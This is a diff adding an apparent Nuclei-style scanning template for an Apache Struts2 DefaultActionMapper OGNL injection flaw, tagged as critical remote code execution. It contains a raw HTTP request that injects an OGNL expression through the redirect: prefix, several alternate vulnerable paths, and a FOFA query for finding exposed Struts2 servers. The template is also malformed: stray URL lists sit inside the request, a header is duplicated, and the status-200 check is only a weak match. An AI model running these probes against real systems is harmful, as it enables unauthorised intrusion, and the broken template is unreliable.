@@ -1,0 +1,46 @@
+id: poc-dq8pz2hsp4mfv94d
+info:
+  name: 某管理系统Apache Struts2 DefaultActionMapper 前缀 OGNL 代码执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dq8pz2hsp4mfv94d'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dq8pz2hsp4mfv94d
+    fofa: app="Struts2"
+http:
+- raw:
+  - 'GET /system/rand.action?redirect:%25{333*444} HTTP/1.1
+
+    Cookie: JSESSIONID=453A6B376FC7D28A5F46F657AEECE509; nowuse_fd_Info=
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Encoding: gzip,deflate,br
+
+    User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)
+
+    Host: {{Hostname}}
+
+    Connection: Keep-alive
+
+
+    其他URL
+
+    [http://127.0.0.1/system/rand.action?redirect:%25%7B333*444%7D"](http://127.0.0.1/system/rand.action?redirect:%2525%257B333*444%257D%22)
+
+    [http://127.0.0.1/index.action?redirect:%25%7B333*444%7D"](http://127.0.0.1/index.action?redirect:%2525%257B333*444%257D%22)
+
+    [http://127.0.0.1/login.action?redirect:%25%7B333*444%7D"](http://127.0.0.1/login.action?redirect:%2525%257B333*444%257D%22)
+
+    [http://127.0.0.1/user.action?redirect:%25%7B333*444%7D"](http://127.0.0.1/user.action?redirect:%2525%257B333*444%257D%22)
+
+    [http://127.0.0.1/index.action?action:%25%7B333*444%7D"](http://127.0.0.1/index.action?action:%2525%257B333*444%257D%22)
+
+    [http://127.0.0.1/index.action?redirectAction:%25%7B333*444%7D"](http://127.0.0.1/index.action?redirectAction:%2525%257B333*444%257D%22)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
